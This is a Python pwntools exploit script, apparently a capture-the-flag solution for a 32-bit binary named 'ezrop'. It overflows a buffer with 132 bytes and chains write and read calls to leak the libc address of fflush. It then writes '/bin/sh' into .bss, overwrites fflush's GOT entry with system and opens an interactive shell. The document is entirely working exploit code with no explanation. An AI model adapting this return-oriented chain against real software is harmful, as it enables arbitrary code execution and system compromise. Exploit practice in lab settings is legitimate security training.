from pwn import *

p = process('./ezrop')
e = ELF('./ezrop')
context(arch='i386',os='linux',endian='little',log_level='debug')

offset=0x230c0
pppr=0x08048569
cmd = '/bin/sh'
payload="A"*132

payload+=p32(e.plt['write'])
payload+=p32(pppr)
payload+=p32(1)
payload+=p32(e.got['fflush'])
payload+=p32(4)

payload+=p32(e.plt['read'])
payload+=p32(pppr)
payload+=p32(0)
payload+=p32(e.bss())
payload+=p32(len(cmd)+1)

payload+=p32(e.plt['read'])
payload+=p32(pppr)
payload+=p32(0)
payload+=p32(e.got['fflush'])
payload+=p32(4)

payload+=p32(e.plt['fflush'])
payload+="AAAA"
payload+=p32(e.bss())

p.sendline(payload)

p.recvuntil("A"*0x64)

fflush = u32(p.recv(4))
system = fflush - offset

p.sendline(cmd)
p.sendline(p32(system))

p.interactive()
